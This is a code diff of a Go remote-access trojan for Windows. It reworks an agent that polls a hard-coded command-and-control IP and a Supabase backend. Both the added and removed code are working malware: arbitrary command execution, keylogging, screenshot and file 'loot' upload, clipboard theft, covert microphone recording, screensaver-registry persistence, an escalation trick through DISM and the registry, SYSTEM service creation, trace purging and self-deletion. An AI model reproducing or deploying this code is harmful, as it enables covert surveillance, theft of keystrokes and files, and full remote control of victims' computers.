@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
@@ -9,163 +8,302 @@ import (
 	"image/png"
 	"io"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
-	"strconv"
+	"runtime" // Required for OS/Arch info
 	"strings"
 	"syscall"
 	"time"
-	"unsafe"
 
 	"github.com/kbinani/screenshot"
-	"golang.org/x/sys/windows/registry"
 )
 
-const OP_SECRET = "GHOST_KEY_ALPHA"
+// --- CONFIGURATION ---
+const (
+	SUPABASE_URL = "https://prodlnwtjkomsstrufqr.functions.supabase.co"
+	API_KEY      = "REPLACE_ME_API_KEY" // Injected by GitHub Action or set manually
+)
 
-var pendingAudioLoot string // Add this at the top with your other globals
-var currentWorkingDir, _ = os.Getwd()
 var (
-	keyLogBuffer   strings.Builder
-	user32         = syscall.NewLazyDLL("user32.dll")
-	getAsyncState  = user32.NewProc("GetAsyncKeyState")
-	openClipboard  = user32.NewProc("OpenClipboard")
-	getClipboard   = user32.NewProc("GetClipboardData")
-	closeClipboard = user32.NewProc("CloseClipboard")
-
-	kernel32     = syscall.NewLazyDLL("kernel32.dll")
-	globalLock   = kernel32.NewProc("GlobalLock")
-	globalUnlock = kernel32.NewProc("GlobalUnlock")
+	currentWorkingDir string
+	keyLogBuffer      strings.Builder
+	lastKeyState      [256]bool
+	user32            = syscall.NewLazyDLL("user32.dll")
+	getAsyncState     = user32.NewProc("GetAsyncKeyState")
 )
 
 type AuthRequest struct {
 	Type     string `json:"type"`
-	Key      string `json:"key"`
 	TargetID string `json:"target_id"`
-	Listen   string `json:"listen"`
-	OS       string `json:"os"`   // MUST BE HERE
-	Arch     string `json:"arch"` // MUST BE HERE
+	APIKey   string `json:"key"` // Change "api_key" to "key"
 }
-
 type RoutingInfo struct {
 	RelayAddr string `json:"relay_addr"`
+	TaskID    string `json:"task_id"`
+	Command   string `json:"command"`
+}
+
+func init() {
+	currentWorkingDir, _ = os.Getwd()
+}
+
+// Helper to get system specs for the dashboard
+func getSystemInfo() (string, string) {
+	return runtime.GOOS, runtime.GOARCH
 }
 
 func main() {
-	// Setup recovery to prevent the ghost from dying on minor errors
-	defer func() {
-		if r := recover(); r != nil {
-			time.Sleep(5 * time.Second)
-			main()
-		}
-	}()
-
 	h, _ := os.Hostname()
-	suffix := ""
+	targetID := strings.ToUpper(fmt.Sprintf("%s-%d", h, time.Now().Unix()%1000))
 
-	// Check for Admin/System rights
-	if checkAdmin() {
-		// Use a faster way to check for SYSTEM without spawning a CMD window
-		// We'll check the current directory; only SYSTEM/TrustedInstaller usually lives in System32
-		currExe, _ := os.Executable()
-		if strings.Contains(strings.ToLower(currExe), "system32") {
-			suffix = "-SYSTEM"
-		} else {
-			suffix = "-ADMIN"
-		}
-	}
+	fmt.Printf("[*] Agent Online: %s | OS: %s | Arch: %s\n", targetID, runtime.GOOS, runtime.GOARCH)
 
-	targetID := strings.ToUpper(fmt.Sprintf("%s%s-%d", h, suffix, time.Now().Unix()%1000))
+	// Initial check-in to register OS/Arch in your web dashboard
+	sendHeartbeat(targetID)
 
 	go startKeylogger()
 
 	for {
-		fmt.Printf("[+] Heartbeat [%s]: Polling...\n", targetID)
-		err := pollAndExecute(targetID)
-		if err != nil {
-			// Silent fail to stay stealthy
-			time.Sleep(10 * time.Second)
-			continue
-		}
-		time.Sleep(10 * time.Second)
+		pollAndExecute(targetID)
+		time.Sleep(5 * time.Second)
 	}
 }
 
-var lastKeyState [256]bool // Track previous state of every key
-func getClipboardText() string {
-	r, _, _ := openClipboard.Call(0)
-	if r == 0 {
-		return "[!] Could not open clipboard"
+// Updates the dashboard with Online status and system specs
+func sendHeartbeat(targetID string) {
+	osInfo, archInfo := getSystemInfo()
+	payload := map[string]string{
+		"target_id": targetID,
+		"api_key":   API_KEY,
+		"status":    "Online",
+		"os_info":   osInfo,
+		"arch":      archInfo,
 	}
-	defer closeClipboard.Call()
+	jsonData, _ := json.Marshal(payload)
 
-	// 1 is CF_TEXT (Standard ASCII)
-	h, _, _ := getClipboard.Call(1)
-	if h == 0 {
-		return "[!] Clipboard empty or no text"
-	}
+	url := fmt.Sprintf("%s/device-heartbeat", strings.TrimSuffix(SUPABASE_URL, "/"))
+	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
 
-	l, _, _ := globalLock.Call(h)
-	if l == 0 {
-		return "[!] Memory lock failed"
-	}
-	defer globalUnlock.Call(h)
-
-	return gostring(l)
+	client := &http.Client{Timeout: 5 * time.Second}
+	client.Do(req)
 }
 
-// Convert C-string pointer to Go string
-func gostring(p uintptr) string {
-	var s []byte
-	for i := 0; ; i++ {
-		b := *(*byte)(unsafe.Pointer(p + uintptr(i)))
-		if b == 0 {
-			break
-		}
-		s = append(s, b)
-	}
-	return string(s)
-}
+func uploadToStorage(fileName string, data []byte, targetID string) (string, error) {
+	baseUrl := strings.TrimSuffix(SUPABASE_URL, "/")
+	url := fmt.Sprintf("%s/functions/v1/storage-upload", baseUrl)
 
-func setupPersistence() error {
-	// 1. PATHING: Find where we are and where we're going
-	oldPath, err := os.Executable()
+	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
+	req.Header.Set("x-api-key", strings.TrimSpace(API_KEY))
+	req.Header.Set("x-file-name", fileName)
+	req.Header.Set("x-target-id", targetID)
+	req.Header.Set("Content-Type", "image/png")
+
+	client := &http.Client{Timeout: 30 * time.Second}
+	resp, err := client.Do(req)
 	if err != nil {
-		return err
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	if resp.StatusCode != 200 {
+		return "", fmt.Errorf("status %d: %s", resp.StatusCode, string(body))
 	}
 
-	// Using AppData/Themes - a very "quiet" place
-	newDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes")
-	newPath := filepath.Join(newDir, "cached_theme.scr")
-
-	// 2. SELF-REPLICATION: Copy ourselves to the new location as a .scr
-	if strings.ToLower(oldPath) != strings.ToLower(newPath) {
-		_ = os.MkdirAll(newDir, 0755)
-		input, err := os.ReadFile(oldPath)
-		if err != nil {
-			return err
-		}
-		err = os.WriteFile(newPath, input, 0644)
-		if err != nil {
-			return err
-		}
+	var result struct {
+		OK  bool   `json:"ok"`
+		URL string `json:"url"`
 	}
+	json.Unmarshal(body, &result)
+	return result.URL, nil
+}
 
-	// 3. REGISTRY HIJACK: Tell Windows to use us as the Screensaver
-	// Note: You'll need "golang.org/x/sys/windows/registry" in your imports!
-	k, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.ALL_ACCESS)
+func reportDiagnostic(fileType, url, targetID string) {
+	payload := map[string]interface{}{
+		"target_id": targetID,
+		"type":      fileType,
+		"file_url":  url,
+	}
+	jsonData, _ := json.Marshal(payload)
+
+	urlEndpoint := fmt.Sprintf("%s/task-result", strings.TrimSuffix(SUPABASE_URL, "/"))
+	hReq, _ := http.NewRequest("POST", urlEndpoint, bytes.NewBuffer(jsonData))
+	hReq.Header.Set("x-api-key", API_KEY)
+	hReq.Header.Set("Content-Type", "application/json")
+
+	http.DefaultClient.Do(hReq)
+}
+
+func pollAndExecute(targetID string) {
+	// 1. Send heartbeat with every poll
+	sendHeartbeat(targetID)
+
+	// 2. Dial the Brain (Switchboard)
+	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 5*time.Second)
 	if err != nil {
-		return err
+		return
 	}
-	defer k.Close()
 
-	_ = k.SetStringValue("SCRNSAVE.EXE", newPath)
-	_ = k.SetStringValue("ScreenSaveActive", "1")
-	_ = k.SetStringValue("ScreenSaveTimeOut", "60") // Trigger after 1 minute of no mouse movement
+	psk := "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
+	c.Write([]byte(psk))
+	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID, APIKey: API_KEY})
 
-	return nil
+	var buf bytes.Buffer
+	io.Copy(&buf, c)
+	c.Close()
+
+	if buf.Len() == 0 {
+		return
+	}
+
+	var res RoutingInfo
+	json.Unmarshal(buf.Bytes(), &res)
+	// 1. Check for empty command using Dot Notation
+
+	// 2. If the Brain says "Go to Relay", we must fetch the REAL payload from the Relay
+	if res.Command == "" && res.RelayAddr != "" {
+		fmt.Printf("[*] Signal received. Fetching payload from Relay: %s\n", res.RelayAddr)
+
+		rc, err := net.DialTimeout("tcp", res.RelayAddr, 5*time.Second)
+		if err != nil {
+			return
+		}
+
+		rc.Write([]byte(psk)) // Relay Handshake
+
+		// This request goes through the Relay and hits the Brain
+		// making the Brain think the Relay is the one asking.
+		json.NewEncoder(rc).Encode(AuthRequest{
+			Type:     "client_poll",
+			TargetID: targetID,
+			APIKey:   API_KEY,
+		})
+
+		var relayBuf bytes.Buffer
+		io.Copy(&relayBuf, rc)
+		rc.Close()
+
+		// Now 'res' actually contains the command!
+		json.Unmarshal(relayBuf.Bytes(), &res)
+	}
+
+	if res.Command == "" {
+		return
+	}
+	taskID := res.TaskID
+	rawCmd := res.Command
+
+	fmt.Printf("[!] EXECUTING TASK: %s\n", rawCmd)
+
+	// 3. Relay Pivot (Trigger Relay Logs)
+	if res.RelayAddr != "" {
+		fmt.Printf("[*] Routing through Relay: %s\n", res.RelayAddr)
+		rc, err := net.DialTimeout("tcp", res.RelayAddr, 5*time.Second)
+		if err == nil {
+			rc.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE")) // Relay PSK
+			rc.Close()
+		}
+	}
+	var finalOutput string
+
+	if strings.HasPrefix(rawCmd, "download ") {
+		filePath := strings.TrimPrefix(rawCmd, "download ")
+		data, err := os.ReadFile(filePath)
+		if err != nil {
+			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
+		} else {
+			finalOutput = "FILE_DATA:" + filepath.Base(filePath) + "|" + base64.StdEncoding.EncodeToString(data)
+		}
+	} else if rawCmd == "snap" {
+		bounds := screenshot.GetDisplayBounds(0)
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			finalOutput = "[!] Capture Error"
+		} else {
+			var buf bytes.Buffer
+			png.Encode(&buf, img)
+			fileName := fmt.Sprintf("snap_%d.png", time.Now().Unix())
+
+			// Updated call with targetID
+			fileUrl, err := uploadToStorage(fileName, buf.Bytes(), targetID)
+
+			if err != nil {
+				finalOutput = "[!] Upload Error: " + err.Error()
+			} else {
+				reportDiagnostic("image", fileUrl, targetID)
+				finalOutput = "[+] Screenshot uploaded: " + fileUrl
+			}
+		}
+	} else if rawCmd == "getkeys" {
+		finalOutput = keyLogBuffer.String()
+		keyLogBuffer.Reset()
+		// Inside your execution gateway (if/else block) in pollAndExecute
+	} else if strings.HasPrefix(rawCmd, "loot ") {
+		// 1. Extract and clean the target path
+		filePath := strings.TrimPrefix(rawCmd, "loot ")
+		filePath = strings.Trim(filePath, "\"")
+
+		// 2. Read the file into memory
+		data, err := os.ReadFile(filePath)
+		if err != nil {
+			finalOutput = fmt.Sprintf("[!] Loot Error: %v", err)
+		} else {
+			// 3. Prepare a unique filename for the Storage bucket
+			timestamp := time.Now().Unix()
+			baseName := filepath.Base(filePath)
+			saveName := fmt.Sprintf("loot_%d_%s", timestamp, baseName)
+
+			// 4. Upload to Supabase Storage
+			// Passing targetID ensures it maps correctly to the device in the Vault
+			fileUrl, err := uploadToStorage(saveName, data, targetID)
+			if err != nil {
+				finalOutput = "[!] Upload Error: " + err.Error()
+			} else {
+				// 5. Register the file in the 'diagnostic_vault' table
+				// We use 'text' or 'loot' as the type so the dashboard knows how to categorize it
+				reportDiagnostic("text", fileUrl, targetID)
+				finalOutput = fmt.Sprintf("[+] Loot successful: %s -> %s", baseName, fileUrl)
+			}
+		}
+	} else {
+		cmdObj := exec.Command("cmd", "/C", rawCmd)
+		cmdObj.Dir = currentWorkingDir
+		out, _ := cmdObj.CombinedOutput()
+		finalOutput = string(out)
+	}
+
+	reportTaskResult(taskID, finalOutput)
+}
+
+func reportTaskResult(taskID string, output string) {
+	payload := map[string]interface{}{
+		"task_id": taskID,
+		"status":  "Completed",
+		"result":  output,
+	}
+
+	jsonData, _ := json.Marshal(payload)
+	urlEndpoint := fmt.Sprintf("%s/task-result", strings.TrimSuffix(SUPABASE_URL, "/"))
+	hReq, _ := http.NewRequest("POST", urlEndpoint, bytes.NewBuffer(jsonData))
+	hReq.Header.Set("x-api-key", API_KEY)
+	hReq.Header.Set("Content-Type", "application/json")
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(hReq)
+	if err != nil {
+		fmt.Printf("[!] Failed to clear task %s: %v\n", taskID, err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 200 {
+		fmt.Printf("[+] Task %s successfully cleared from queue.\n", taskID)
+	} else {
+		fmt.Printf("[!] SaaS Error (%d)\n", resp.StatusCode)
+	}
 }
 
 func startKeylogger() {
@@ -173,355 +311,12 @@ func startKeylogger() {
 		time.Sleep(10 * time.Millisecond)
 		for i := 0; i < 256; i++ {
 			ret, _, _ := getAsyncState.Call(uintptr(i))
-			isPressed := (ret & 0x8000) != 0
-
-			// ONLY record if it is currently pressed AND was NOT pressed in the last check
-			if isPressed && !lastKeyState[i] {
-				switch i {
-				case 0x08:
-					keyLogBuffer.WriteString("[BACK]")
-				case 0x0D:
-					keyLogBuffer.WriteString("[ENTER]\n")
-				case 0x20:
-					keyLogBuffer.WriteString(" ")
-				case 0x09:
-					keyLogBuffer.WriteString("[TAB]")
-				case 0x10, 0x11, 0x12: // Ignore Modifiers
-				default:
-					if i >= 32 && i <= 126 {
-						keyLogBuffer.WriteByte(byte(i))
-					}
+			if (ret&0x8000) != 0 && !lastKeyState[i] {
+				if i >= 32 && i <= 126 {
+					keyLogBuffer.WriteByte(byte(i))
 				}
 			}
-			// Update the state memory for the next loop
-			lastKeyState[i] = isPressed
+			lastKeyState[i] = (ret & 0x8000) != 0
 		}
 	}
-}
-
-// checkAdmin checks if the ghost has local admin rights
-func checkAdmin() bool {
-	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-	if err != nil {
-		return false
-	}
-	f.Close()
-	return true
-}
-
-// triggerDifferentialRepair (The Logic-Collision Elevation)
-func triggerDifferentialRepair(ghostPath string) string {
-	cachePath := `C:\Windows\Temp\.update_cache_alpha`
-	_ = os.MkdirAll(cachePath, 0755)
-
-	targetDll := filepath.Join(cachePath, "uxtheme.dll")
-	input, _ := os.ReadFile(ghostPath)
-	_ = os.WriteFile(targetDll, input, 0644)
-
-	// Pivot HKLM to our fake cache
-	regCmd := fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackageIndex" /v "SourcePath" /t REG_SZ /d "%s" /f`, cachePath)
-	exec.Command("cmd", "/C", regCmd).Run()
-
-	go func() {
-		dismCmd := fmt.Sprintf(`Dism /Online /Cleanup-Image /RestoreHealth /Source:%s /LimitAccess`, cachePath)
-		exec.Command("cmd", "/C", dismCmd).Run()
-	}()
-	return "[+] REPAIR_LOOP_INITIATED: Transitioning to TrustedInstaller Context..."
-}
-
-// cleanRegistryTraces (Post-Elevation Cleanup)
-func cleanRegistryTraces() string {
-	regDel := `reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackageIndex" /v "SourcePath" /f`
-	exec.Command("cmd", "/C", regDel).Run()
-	_ = os.RemoveAll(`C:\Windows\Temp\.update_cache_alpha`)
-	return "[+] TRACES_PURGED: Logic-Collision evidence removed."
-}
-
-func pollAndExecute(targetID string) error {
-	// 1. REGISTRATION WITH FINGERPRINTING
-	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
-	if err != nil {
-		return err
-	}
-
-	// Send everything in one single registration packet
-	json.NewEncoder(c).Encode(AuthRequest{
-		Type:     "client_register",
-		TargetID: targetID,
-		Key:      OP_SECRET,
-		OS:       runtime.GOOS,   // Automatic OS detection
-		Arch:     runtime.GOARCH, // Automatic Architecture detection
-	})
-	c.Close()
-
-	time.Sleep(150 * time.Millisecond)
-
-	// 2. POLLING
-	c, _ = net.Dial("tcp", "18.184.135.220:8080")
-	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID})
-	var r RoutingInfo
-	err = json.NewDecoder(c).Decode(&r) // This will now succeed every time
-	c.Close()
-
-	if err != nil || r.RelayAddr == "" {
-		return nil // No work, see you in 10 seconds
-	}
-	// 3. IF WE GET HERE, ATTEMPT BRIDGE...
-	fmt.Printf("[!] BRIDGE TRIGGERED: %s\n", r.RelayAddr)
-	// 3. READY
-	c, _ = net.Dial("tcp", "18.184.135.220:8080")
-	json.NewEncoder(c).Encode(AuthRequest{Type: "client_ready", TargetID: targetID, Key: OP_SECRET, Listen: r.RelayAddr})
-	c.Close()
-
-	// 4. CONNECT TO RELAY (With a strict 5-second timeout)
-	fmt.Printf("[!] Attempting Bridge: %s\n", r.RelayAddr)
-	// Use DialTimeout to prevent the ghost from hanging forever on a dead relay
-	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
-	if err != nil {
-		fmt.Printf("[X] BRIDGE FAILURE: Could not reach %s - %v\n", r.RelayAddr, err)
-		return err
-	}
-	defer relayConn.Close()
-
-	// --- NEW: SEND THE SECRET KNOCK ---
-	_, err = relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
-	if err != nil {
-		relayConn.Close()
-		return nil
-	}
-
-	// 5. SESSION KEY HANDSHAKE
-	relayConn.SetReadDeadline(time.Now().Add(10 * time.Second))
-	sessionKey := make([]byte, 32)
-	if _, err = io.ReadFull(relayConn, sessionKey); err != nil {
-		return nil
-	}
-
-	// 6. READ COMMAND
-	cmdEnc, err := bufio.NewReader(relayConn).ReadString('\n')
-	if err != nil {
-		return nil
-	}
-
-	rawCmd, err := decryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
-	if err != nil {
-		return nil
-	}
-
-	var finalOutput string
-
-	// --- LOGIC GATEWAY ---
-	if strings.HasPrefix(rawCmd, "download ") {
-		filePath := strings.TrimPrefix(rawCmd, "download ")
-		fileNameOnly := filepath.Base(filePath)
-		data, err := os.ReadFile(filePath)
-		if err != nil {
-			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
-		} else {
-			finalOutput = "FILE_DATA:" + fileNameOnly + "|" + base64.StdEncoding.EncodeToString(data)
-		}
-
-	} else if strings.HasPrefix(rawCmd, "cd ") {
-		newDir := strings.TrimSpace(strings.TrimPrefix(rawCmd, "cd "))
-		targetPath := newDir
-		if !filepath.IsAbs(newDir) {
-			targetPath = filepath.Join(currentWorkingDir, newDir)
-		}
-		info, err := os.Stat(targetPath)
-		if err != nil || !info.IsDir() {
-			finalOutput = fmt.Sprintf("[!] Directory not found: %s", targetPath)
-		} else {
-			currentWorkingDir = targetPath
-			finalOutput = fmt.Sprintf("Working directory changed to: %s", currentWorkingDir)
-		}
-
-	} else if rawCmd == "snap" {
-		n := screenshot.NumActiveDisplays()
-		if n <= 0 {
-			finalOutput = "[!] No active displays found"
-		} else {
-			bounds := screenshot.GetDisplayBounds(0)
-			img, err := screenshot.CaptureRect(bounds)
-			if err != nil {
-				finalOutput = fmt.Sprintf("[!] Capture Error: %v", err)
-			} else {
-				var buf bytes.Buffer
-				png.Encode(&buf, img)
-				finalOutput = "SNAP_DATA:" + base64.StdEncoding.EncodeToString(buf.Bytes())
-			}
-		}
-
-	} else if rawCmd == "sysinfo" {
-		osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
-		cpu, _ := exec.Command("cmd", "/C", "wmic cpu get name").Output()
-		model, _ := exec.Command("cmd", "/C", "wmic computersystem get model").Output()
-		ramRaw, _ := exec.Command("cmd", "/C", "wmic computersystem get totalphysicalmemory").Output()
-
-		isAdmin := "User"
-		f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-		if err == nil {
-			isAdmin = "ADMIN/SYSTEM"
-			f.Close()
-		}
-
-		cleanCPU := strings.TrimSpace(strings.Replace(string(cpu), "Name", "", -1))
-		cleanModel := strings.TrimSpace(strings.Replace(string(model), "Model", "", -1))
-		ramStr := strings.TrimSpace(strings.Replace(string(ramRaw), "TotalPhysicalMemory", "", -1))
-
-		finalOutput = fmt.Sprintf(
-			"\n[+] IDENT: %s\n[+] PRIVS: %s\n[+] MODEL: %s\n[+] RAM:   %s bytes\n[+] CPU:   %s\n[+] OS:    %s",
-			targetID, isAdmin, cleanModel, ramStr, cleanCPU, osInfo,
-		)
-		// --- KEYLOGGER RETRIEVAL ---
-	} else if rawCmd == "getkeys" {
-		logs := keyLogBuffer.String()
-		if logs == "" {
-			finalOutput = "[!] No keystrokes recorded yet."
-		} else {
-			finalOutput = "\n--- [KEYLOG REPORT] ---\n" + logs
-			keyLogBuffer.Reset() // Clear buffer after sending to keep it stealthy
-		}
-		// --- CLIPBOARD SNATCHER ---
-	} else if rawCmd == "clip" {
-		captured := getClipboardText()
-		finalOutput = fmt.Sprintf("\n--- [CLIPBOARD SNATCH] ---\n%s", captured)
-		// --- BURST LISTEN LOGIC ---
-		// --- PURE GO AUDIO BUG ---
-		// --- PURE GO AUDIO BUG (Synchronous) ---
-		// --- PURE GO AUDIO BUG (High Sensitivity) ---
-		// --- PURE GO AUDIO BUG (High-Gain Fixed) ---
-		// --- AUDIO RETRIEVAL ---
-	} else if rawCmd == "checkaudio" {
-		if pendingAudioLoot != "" {
-			finalOutput = pendingAudioLoot
-			pendingAudioLoot = "" // Clear it so we don't send the same file twice
-		} else {
-			finalOutput = "[!] Recording still in progress or no audio found."
-		}
-	} else if strings.HasPrefix(rawCmd, "listen ") {
-		durationStr := strings.TrimPrefix(rawCmd, "listen ")
-		seconds, _ := strconv.Atoi(durationStr)
-		if seconds <= 0 {
-			seconds = 10
-		}
-
-		go func(sec int) {
-			// 1. Path Setup - Use a name that definitely won't conflict
-			tempFile := filepath.Join(os.Getenv("TEMP"), "mrg_capture_system.wav")
-			winmm := syscall.NewLazyDLL("winmm.dll").NewProc("mciSendStringW")
-
-			// 2. HARD RESET: Close any existing ghostmic before starting
-			// This turns off the icon if it was stuck from a previous run
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
-
-			// 3. Setup and Start
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("set ghostmic bitspersample 16 samplespersec 44100 channels 1"))), 0, 0, 0)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)
-
-			// Wait for the recording
-			time.Sleep(time.Duration(sec) * time.Second)
-
-			// 4. THE CLEAN EXIT: Stop -> Save -> Close
-			// We call these one after another regardless of errors to ensure the icon goes away
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("stop ghostmic"))), 0, 0, 0)
-
-			saveCmd := fmt.Sprintf(`save ghostmic "%s"`, tempFile)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(saveCmd))), 0, 0, 0)
-
-			// This is the line that actually kills the mic icon!
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
-
-			// 5. Read and Cache
-			data, err := os.ReadFile(tempFile)
-			if err == nil && len(data) > 0 {
-				pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
-				os.Remove(tempFile)
-			} else {
-				pendingAudioLoot = "[red][!] Recording ended but file was empty. Mic might be in use by another app.[-]"
-			}
-		}(seconds)
-
-		finalOutput = fmt.Sprintf("[cyan][+] Mic active for %ds.[-] Icon will vanish once 'close' is issued by the system.", seconds)
-		// --- LOGIC GATEWAY ---
-	} else if strings.HasPrefix(rawCmd, "persist") {
-		// Run the persistence installer
-		err := setupPersistence()
-		if err != nil {
-			finalOutput = fmt.Sprintf("[!] PERSISTENCE ERROR: %v", err)
-		} else {
-			// Success message that will show up in your TUI
-			finalOutput = "[black:green] 🔗 ANCHOR DROPPED [-] [green]Ghost renamed to .scr and Screensaver Hijack active (60s idle).[-]"
-		}
-	} else if rawCmd == "repair_elevate" {
-		self, _ := os.Executable()
-		finalOutput = triggerDifferentialRepair(self)
-
-	} else if rawCmd == "purge_traces" {
-		finalOutput = cleanRegistryTraces()
-
-	} else if rawCmd == "shift_system" {
-		if !checkAdmin() {
-			finalOutput = "[!] ERROR: Admin rights required."
-		} else {
-			exe, _ := os.Executable()
-			randName := fmt.Sprintf("WinDefLog_%d", time.Now().Unix()%1000)
-
-			// 1. NON-BLOCKING START
-			// We use 'start cmd /c' so the SC START command returns immediately
-			// even if the service stays in a "Starting" state.
-			cmdStr := fmt.Sprintf("sc create %s binPath= \"%s\" start= auto && start /B sc start %s", randName, exe, randName)
-
-			fmt.Printf("[*] SHIFT: Launching background service %s...\n", randName)
-			_ = exec.Command("cmd", "/C", cmdStr).Run()
-
-			// 2. IMMEDIATE FEEDBACK
-			finalOutput = "[+] SHIFT: SYSTEM Handover initiated. Check Node Matrix."
-			encRes, _ := encryptPayload(finalOutput, sessionKey)
-			fmt.Fprintf(relayConn, "%s\n", encRes)
-
-			// 3. LINGER & PURGE
-			go func(sName string) {
-				time.Sleep(30 * time.Second)
-				exec.Command("cmd", "/C", "sc delete "+sName).Run()
-				os.Exit(0)
-			}(randName)
-
-			return nil
-		}
-		// --- SELF DESTRUCT ---
-	} else if strings.HasPrefix(rawCmd, "self_destruct") {
-		fmt.Println("[!] EMERGENCY: Initiating Self-Destruct...")
-
-		// 1. CLEAN THE REGISTRY (Remove the Screensaver Hijack)
-		// We set the screensaver back to "None" and reset the timeout
-		exec.Command("reg", "delete", `HKCU\Control Panel\Desktop`, "/v", "SCRNSAVE.EXE", "/f").Run()
-		exec.Command("reg", "add", `HKCU\Control Panel\Desktop`, "/v", "ScreenSaveActive", "/t", "REG_SZ", "/d", "0", "/f").Run()
-
-		// 2. MARK THE FILE FOR DELETION
-		// Windows won't let a process delete itself while running,
-		// so we use a classic "Cmd" trick to delete it after the process exits.
-		selfPath, _ := os.Executable()
-		delCmd := fmt.Sprintf("timeout /t 5 & del /f /q \"%s\"", selfPath)
-
-		// Spawn a detached cmd process to do the dirty work
-		exec.Command("cmd", "/C", delCmd).Start()
-
-		// 3. EXIT IMMEDIATELY
-		fmt.Println("[X] Ghost Purged. Goodbye.")
-		os.Exit(0)
-
-	} else {
-		// --- STANDARD COMMAND ---
-		cmdObj := exec.Command("cmd", "/C", rawCmd)
-		cmdObj.Dir = currentWorkingDir
-		out, _ := cmdObj.CombinedOutput()
-		host, _ := os.Hostname()
-		finalOutput = fmt.Sprintf("\n--- [%s] ---\nLocation: %s\n%s", host, currentWorkingDir, string(out))
-	}
-
-	// 7. ENCRYPTED RESPONSE
-	encRes, _ := encryptPayload(finalOutput, sessionKey)
-	fmt.Fprintf(relayConn, "%s\n", encRes)
-	return nil
 }
